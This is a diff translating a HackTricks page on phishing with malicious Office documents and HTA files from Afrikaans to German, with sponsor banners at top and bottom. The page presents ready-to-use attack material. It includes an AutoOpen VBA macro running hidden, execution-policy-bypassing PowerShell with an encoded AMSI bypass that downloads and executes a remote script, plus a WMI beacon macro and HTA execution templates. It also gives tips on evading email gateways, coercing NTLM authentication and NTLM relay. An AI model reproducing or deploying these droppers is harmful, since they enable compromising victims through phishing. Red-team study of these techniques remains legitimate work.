@@ -1,53 +1,53 @@
-# Phishing Files & Documents
+# Phishing-Dateien & Dokumente
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
-## Office Dokumente
+## Office-Dokumente
 
-Microsoft Word voer lêerdata-validasie uit voordat 'n lêer geopen word. Data-validasie word uitgevoer in die vorm van data-struktuuridentifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die data-struktuuridentifikasie voorkom, sal die lêer wat geanaliseer word nie geopen word nie.
+Microsoft Word führt eine Datenvalidierung der Datei, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung der Datenstruktur, gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.
 
-Gewoonlik gebruik Word-lêers wat makros bevat die `.docm` uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
-Byvoorbeeld, 'n RTF-lêer ondersteun nie makros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees tot makro-uitvoering.\
-Die dieselfde interne meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint, ens.).
+In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateierweiterung ändert und dennoch die Fähigkeit zur Ausführung von Makros beibehält.\
+Zum Beispiel unterstützt eine RTF-Datei aus Designgründen keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
+Die gleichen internen Abläufe und Mechanismen gelten für alle Software der Microsoft Office Suite (Excel, PowerPoint usw.).
 
-Jy kan die volgende opdrag gebruik om te kyk watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
+Du kannst den folgenden Befehl verwenden, um zu überprüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX-lêers wat 'n eksterne sjabloon verwys (Lêer – Opsies – Byvoegsels – Bestuur: Sjablone – Gaan) wat makros insluit, kan ook makros “uitvoer”.
+DOCX-Dateien, die auf eine entfernte Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), können ebenfalls „Makros“ ausführen.
 
-### Eksterne Beeld Laai
+### Externe Bildladung
 
-Gaan na: _Invoeg --> Vinne Onderdeel --> Veld_\
-&#xNAN;_**Kategoriewe**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://\<ip>/whatever
+Gehe zu: _Einfügen --> Schnelle Teile --> Feld_\
+&#xNAN;_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
-### Makros Agterdeur
+### Makros-Hintertür
 
-Dit is moontlik om makros te gebruik om arbitrêre kode vanaf die dokument uit te voer.
+Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.
 
-#### Outomatiese laai funksies
+#### Autoload-Funktionen
 
-Hoe meer algemeen hulle is, hoe meer waarskynlik sal die AV hulle opspoor.
+Je häufiger sie sind, desto wahrscheinlicher wird sie der AV erkennen.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Makros Kode Voorbeelde
+#### Makros-Codebeispiele
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -77,26 +77,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Verwyder metadata handmatig
+#### Manuell Metadaten entfernen
 
-Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopbring. Klik op **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.
+Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, was den Dokumentinspektor öffnet. Klicke auf **Überprüfen** und dann auf **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.
 
-#### Doc-uitbreiding
+#### Doc-Erweiterung
 
-Wanneer jy klaar is, kies **Save as type** dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
-Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`** uitbreiding (bv. die miniatuurikoon het 'n groot `!` en sommige web/e-pos poorte blokkeer hulle heeltemal). Daarom is hierdie **erf `.doc` uitbreiding die beste kompromie**.
+Wenn du fertig bist, wähle im Dropdown **Speichern unter** das Format von **`.docx`** auf **Word 97-2003 `.doc`**.\
+Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`** Erweiterung gibt (z.B. hat das Miniaturansichtsicon ein riesiges `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **Legacy `.doc` Erweiterung der beste Kompromiss**.
 
-#### Kwaadwillige Makro Generators
+#### Bösartige Makro-Generatoren
 
 * MacOS
 * [**macphish**](https://github.com/cldrn/macphish)
 * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Lêers
+## HTA-Dateien
 
-'n HTA is 'n Windows-program wat **HTML en skriptaal (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkings van 'n blaaiers se sekuriteitsmodel.
+Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript)** kombiniert. Es generiert die Benutzeroberfläche und wird als "vollständig vertrauenswürdige" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.
 
-'n HTA word uitgevoer met **`mshta.exe`**, wat tipies **geïnstalleer** word saam met **Internet Explorer**, wat **`mshta` afhanklik van IE** maak. So as dit verwyder is, sal HTA's nie in staat wees om uit te voer nie.
+Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise **zusammen mit** **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig ist**. Wenn es deinstalliert wurde, können HTAs nicht ausgeführt werden.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -151,11 +151,11 @@ var_func
 self.close
 </script>
 ```
-## Dwing NTLM-outeenteking
+## NTLM-Authentifizierung erzwingen
 
-Daar is verskeie maniere om **NTLM-outeenteking "afgeleë"** te **dwing**, byvoorbeeld, jy kan **on sigbare beelde** by e-posse of HTML voeg wat die gebruiker sal toegang hê tot (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **outeenteking** net vir **die oopmaak van die gids** sal **aktiveer**.
+Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung "aus der Ferne" zu erzwingen**, zum Beispiel könnten Sie **unsichtbare Bilder** in E-Mails oder HTML hinzufügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder senden Sie dem Opfer die **Adresse von Dateien**, die eine **Authentifizierung** nur durch **Öffnen des Ordners** **auslösen** werden.
 
-**Kyk na hierdie idees en meer op die volgende bladsye:**
+**Überprüfen Sie diese Ideen und mehr auf den folgenden Seiten:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -165,24 +165,24 @@ Daar is verskeie maniere om **NTLM-outeenteking "afgeleë"** te **dwing**, byvoo
 [places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
 {% endcontent-ref %}
 
-### NTLM Relay
+### NTLM-Relay
 
-Moet nie vergeet dat jy nie net die hash of die outeenteking kan steel nie, maar ook **NTLM relay-aanvalle** kan **uitvoer**:
+Vergessen Sie nicht, dass Sie nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe** **durchführen** können:
 
-* [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**NTLM-Relay-Angriffe**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (NTLM-Relay zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>HackTricks unterstützen</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
